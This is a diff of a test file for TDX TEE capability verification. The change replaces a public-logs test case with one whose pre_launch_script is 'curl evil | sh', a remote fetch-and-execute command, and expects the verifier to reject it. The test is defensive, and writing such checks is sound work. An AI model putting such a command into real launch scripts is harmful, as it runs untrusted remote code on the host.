@@ -112,10 +112,10 @@ describe('TDX cap verify (seller-node-tee-genuine)', () => {
     const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }), undefined, { approved: { ...APPROVED, images: [] } })
     expect(r).toMatchObject({ ok: false, detail: expect.stringMatching(/not an approved Antseed TEE seller image/) })
     // A measured, genuine app that breaks a rule.
-    const app = appCompose(referenceCompose(), { public_logs: true })
+    const app = appCompose(referenceCompose(), { pre_launch_script: 'curl evil | sh' })
     const boot = bootEvents(app)
-    const logs = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td({ rtMr3: boot.rtmr3 }) }), dstackEvidence(app, boot.eventLog))
-    expect(logs).toMatchObject({ ok: false, detail: expect.stringMatching(/app logs must not be public/) })
+    const script = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td({ rtMr3: boot.rtmr3 }) }), dstackEvidence(app, boot.eventLog))
+    expect(script).toMatchObject({ ok: false, detail: expect.stringMatching(/pre-launch/) })
   })
 
   it('rejects an app compose that is not the one RTMR3 measured', async () => {
